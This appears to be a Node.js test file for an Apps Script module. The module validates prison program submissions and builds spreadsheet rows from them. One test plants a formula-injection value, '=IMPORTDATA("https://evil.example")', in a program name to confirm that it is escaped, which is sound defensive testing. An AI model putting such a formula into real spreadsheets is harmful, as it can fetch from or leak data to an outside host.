// Checks Rows.gs without Google: run `node apps-script/tests.js` from the repo root.
// No packages needed. Exits non-zero if anything fails.

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const assert = require('assert');

const context = {};
vm.createContext(context);
vm.runInContext(fs.readFileSync(path.join(__dirname, 'Rows.gs'), 'utf8'), context);
const { buildRows, HEADER } = context;

const filer = { organization: 'Test Org', email: 'staff@example.org', signedIn: true };
const meta = { submissionId: 'ABCD1234', submittedAt: '2026-10-25T01:00:00.000Z' };
const program = (overrides = {}) => ({
  name: 'Prog A', status: 'Completed', startDate: '2026-09-01', endDate: '2026-10-01', courseHours: 20,
  sites: [{ facilityCode: 'SQ', yard: 'North', participants: 10, completed: 8 }],
  ...overrides
});
// Arrays made inside the sandbox aren't "strictly equal" to ordinary ones, so copy them out.
const plain = value => JSON.parse(JSON.stringify(value));
const run = (programs, who = filer) => plain(buildRows({ programs }, who, meta));

let passed = 0;
function test(name, fn) {
  try { fn(); passed++; console.log('ok  ', name); }
  catch (error) { console.log('FAIL', name, '\n     ', error.message); process.exitCode = 1; }
}

test('header has TPW\'s 14 columns then 4 filing columns', () => {
  assert.strictEqual(HEADER.length, 18);
  assert.strictEqual(HEADER[0], 'CDCR Facility');
  assert.strictEqual(HEADER[13], 'Notes');
});

test('one yard makes one row in TPW\'s column order', () => {
  const { errors, rows } = run([program()]);
  assert.deepStrictEqual(errors, []);
  assert.deepStrictEqual(rows[0], [
    'San Quentin Rehabilitation Center (SQ)', 'North', 'Test Org', 'Prog A', 'Completed',
    '09/01/2026', '10/01/2026', 20, 10, 8, '', 160, 2026, '',
    'ABCD1234', '2026-10-25T01:00:00.000Z', 'staff@example.org', 'Yes'
  ]);
});

test('a program in three yards makes three rows, each with its own numbers', () => {
  const { errors, rows } = run([program({ sites: [
    { facilityCode: 'SQ', yard: 'North', participants: 10, completed: 8 },
    { facilityCode: 'SQ', yard: 'South', participants: 5, completed: 5 },
    { facilityCode: 'FSP', yard: 'A Yard', participants: 12, completed: 0 }
  ] })]);
  assert.deepStrictEqual(errors, []);
  assert.strictEqual(rows.length, 3);
  assert.deepStrictEqual(rows.map(r => [r[1], r[8], r[9]]), [['North', 10, 8], ['South', 5, 5], ['A Yard', 12, 0]]);
  const totalParticipants = rows.reduce((sum, r) => sum + r[8], 0);
  assert.strictEqual(totalParticipants, 27, 'no double counting');
});

test('completed above participants is refused and nothing is written', () => {
  const { errors, rows } = run([program({ sites: [{ facilityCode: 'SQ', yard: 'North', participants: 10, completed: 15 }] })]);
  assert.strictEqual(rows.length, 0);
  assert.match(errors[0], /completed \(15\) is more than participants \(10\)/);
});

test('one bad program stops the whole submission', () => {
  const { errors, rows } = run([program(), program({ name: 'Prog B', endDate: '2026-08-01' })]);
  assert.strictEqual(rows.length, 0);
  assert.match(errors[0], /end date is before the start date/);
});

test('date rules match the form', () => {
  assert.match(run([program({ status: 'In Progress', startDate: '' })]).errors[0], /start date is needed/);
  assert.match(run([program({ endDate: '' })]).errors[0], /end date is needed/);
  assert.deepStrictEqual(run([program({ status: 'Planned', startDate: '', endDate: '' })]).errors, []);
  assert.match(run([program({ startDate: '2026-02-30' })]).errors[0], /isn’t a real date/);
});

test('unknown prisons, bad statuses and non-whole numbers are refused', () => {
  assert.match(run([program({ sites: [{ facilityCode: 'XYZ', yard: 'North', participants: 1, completed: 0 }] })]).errors[0], /unknown prison/);
  assert.match(run([program({ status: 'Done' })]).errors[0], /schedule status/);
  assert.match(run([program({ sites: [{ facilityCode: 'SQ', yard: 'North', participants: 2.5, completed: 0 }] })]).errors[0], /whole numbers/);
  assert.match(run([program({ sites: [{ facilityCode: 'SQ', yard: 'North', participants: '10', completed: 0 }] })]).errors[0], /whole numbers/);
});

test('the same yard twice in one program is refused', () => {
  const twice = [{ facilityCode: 'SQ', yard: 'North', participants: 1, completed: 0 }, { facilityCode: 'SQ', yard: 'north', participants: 1, completed: 0 }];
  assert.match(run([program({ sites: twice })]).errors[0], /listed twice/);
});

test('typed text can\'t become a spreadsheet formula', () => {
  const { rows } = run([program({ name: '=IMPORTDATA("https://evil.example")' })], { ...filer, organization: '+Org' });
  assert.strictEqual(rows[0][3], '\'=IMPORTDATA("https://evil.example")');
  assert.strictEqual(rows[0][2], '\'+Org');
});

test('no organization means nothing is written', () => {
  assert.match(run([program()], { organization: '  ', email: '', signedIn: false }).errors[0], /No organization/);
});

test('an empty or missing program list is refused', () => {
  assert.match(buildRows({}, filer, meta).errors[0], /no programs/);
  assert.match(buildRows(null, filer, meta).errors[0], /no programs/);
});

console.log(`\n${passed} passed${process.exitCode ? ', some failed' : ''}`);
